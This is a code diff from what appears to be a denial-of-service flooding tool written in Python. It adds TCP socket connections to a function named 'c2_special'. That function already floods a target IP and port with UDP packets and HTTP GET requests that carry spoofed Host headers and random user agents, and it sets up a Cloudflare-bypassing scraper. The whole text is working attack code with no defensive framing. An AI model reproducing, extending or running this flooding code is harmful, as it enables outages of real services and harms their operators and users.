@@ -3524,6 +3524,7 @@ elif answer == ("20"):
                 print("Skipped")
                 bps = bps
                 pass
+            attack = int(0)
             def c2_special():
                 for fk in fake:
                     try:
@@ -3545,6 +3546,11 @@ elif answer == ("20"):
                         tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                         scraper = cloudscraper.CloudScraper(disableCloudflareV1=True)
                         scraper = cloudscraper.create_scraper(browser='chrome')
+                        t = str(ip)
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((t,port))
+                        s.send(("GET /"+ip+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\n").encode('ascii'))
+                        s.sendto(byte,(ip,port))
                         for i in range(bps):
                             udp.sendto(byte, (ip,port))
                             udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
@@ -3583,6 +3589,11 @@ elif answer == ("20"):
                         tls.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n"))
                         scraper = cloudscraper.CloudScraper(disableCloudflareV1=True)
                         scraper = cloudscraper.create_scraper(browser='chrome')
+                        t = str(ip)
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((t,port))
+                        s.send(("GET /"+ip+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\n").encode('ascii'))
+                        s.sendto(byte,(ip,port))
                         for i in range(bps):
                             udp.sendto(byte, (ip,port))
                             udp.sendto(byte,("GET "+ip+" HTTP/1.1\r\nHost: "+fk+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
